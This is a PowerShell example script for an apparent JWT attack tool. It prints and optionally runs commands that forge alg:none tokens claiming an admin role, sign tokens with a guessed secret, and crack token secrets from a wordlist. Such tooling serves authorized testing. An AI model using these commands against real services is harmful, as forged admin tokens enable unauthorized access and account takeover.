# JWT Attacker Tool - Windows PowerShell Examples
# This script demonstrates the correct usage of JWT Attacker Tool in Windows PowerShell

Write-Host "JWT Attacker Tool - Windows PowerShell Examples" -ForegroundColor Green
Write-Host "=================================================" -ForegroundColor Green
Write-Host ""

# Example 1: Create alg:none token
Write-Host "Example 1: Creating alg:none JWT token" -ForegroundColor Yellow
Write-Host "Command: python -m jwt_attacker alg-none --payload '{\"user\":\"admin\",\"role\":\"administrator\"}'" -ForegroundColor Cyan
Write-Host ""

# Example 2: Forge JWT token
Write-Host "Example 2: Forging JWT token with secret" -ForegroundColor Yellow
Write-Host "Command: python -m jwt_attacker forge --payload '{\"user\":\"admin\"}' --secret 'mysecret'" -ForegroundColor Cyan
Write-Host ""

# Example 3: Crack JWT token
Write-Host "Example 3: Cracking JWT token" -ForegroundColor Yellow
Write-Host "Command: python -m jwt_attacker crack --token 'eyJ0eXAiOi...' --wordlist examples/wordlist.txt" -ForegroundColor Cyan
Write-Host ""

Write-Host "Tips for Windows PowerShell:" -ForegroundColor Green
Write-Host "- Use single quotes around the entire JSON payload" -ForegroundColor White
Write-Host "- Escape double quotes inside JSON with backslash: \" " -ForegroundColor White
Write-Host "- Example: --payload '{\"key\":\"value\"}' " -ForegroundColor White
Write-Host ""

Write-Host "Common Issues:" -ForegroundColor Red
Write-Host "- Don't use single quotes for JSON keys: {'user':'admin'} ❌" -ForegroundColor White
Write-Host "- Always use double quotes for JSON: {\"user\":\"admin\"} ✅" -ForegroundColor White
Write-Host ""

# Ask user if they want to run an example
$choice = Read-Host "Do you want to run Example 1 (alg:none attack)? (y/n)"
if ($choice -eq "y" -or $choice -eq "Y") {
    Write-Host "Running Example 1..." -ForegroundColor Green
    python -m jwt_attacker alg-none --payload '{\"user\":\"admin\",\"role\":\"administrator\"}'
}

Write-Host ""
Write-Host "For more help, run: python -m jwt_attacker --help" -ForegroundColor Green
